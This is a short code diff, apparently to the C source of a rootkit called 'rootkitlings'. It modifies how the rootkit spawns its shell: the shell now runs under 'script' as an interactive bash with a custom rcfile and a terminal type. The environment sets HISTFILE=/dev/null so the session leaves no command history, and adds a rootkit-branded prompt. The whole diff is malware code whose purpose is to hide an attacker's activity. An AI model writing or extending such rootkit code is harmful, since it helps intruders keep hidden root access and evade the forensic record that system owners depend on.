@@ -22,14 +22,20 @@
 
 static char *rk_shell_argv[] = {
 	"setsid",
-	"/bin/sh",
+	"/bin/script",
+	"-q",
+	"-c",
+	"/bin/bash --noprofile --rcfile /etc/rootkitlings.bashrc -i",
+	"/dev/null",
 	NULL,
 };
 
 static char *rk_shell_envp[] = {
 	"HOME=/",
 	"PATH=/bin",
-	"TERM=dumb",
+	"TERM=xterm-256color",
+	"HISTFILE=/dev/null",
+	"PS1=(rootkitlings) \\w # ",
 	NULL,
 };
 
